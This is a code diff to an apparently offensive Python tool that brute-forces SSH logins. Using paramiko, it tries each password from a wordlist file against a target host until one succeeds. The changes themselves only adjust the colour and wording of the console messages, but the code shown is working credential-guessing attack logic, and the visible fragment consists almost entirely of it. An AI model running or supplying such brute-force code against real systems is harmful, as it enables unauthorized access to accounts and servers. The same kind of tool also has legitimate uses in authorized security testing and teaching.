@@ -10,7 +10,7 @@ def ssh_connect(username: str, password: str, host: str, code: int =0) -> int:
         SSH_conn.connect(hostname=host, port=22, username=username, password=password)
     except paramiko.AuthenticationException:
         code = 1
-        termcolor.cprint(f'[!] Password {password} incorrect for user {username} ')
+        termcolor.cprint(f'[!] Password: {password} incorrect for user: {username} ','red')
     except socket.error as e:
         code = 2
         termcolor.cprint(e, "red")
@@ -31,10 +31,10 @@ def main(arguments):
         with open(input_file, 'r') as file:
             for line in file.readlines():
                 password = line.strip("\n")
-                termcolor.cprint(f'[*] Attempting to connect to {username}@{host} with password {password}', "yellow")
+                termcolor.cprint(f'[*] Attempting to connect to {username}@{host} with password: {password}', "yellow")
                 response = ssh_connect(username, password, host)
                 if response == 0:
-                    termcolor.cprint(f'[+] Correct password found: {password} for user {username}', 'green', 'on_black')
+                    termcolor.cprint(f'[+] Correct password found: {password} for user {username}', 'green')
                     # on success break loop, no need to keep trying
                     break
 
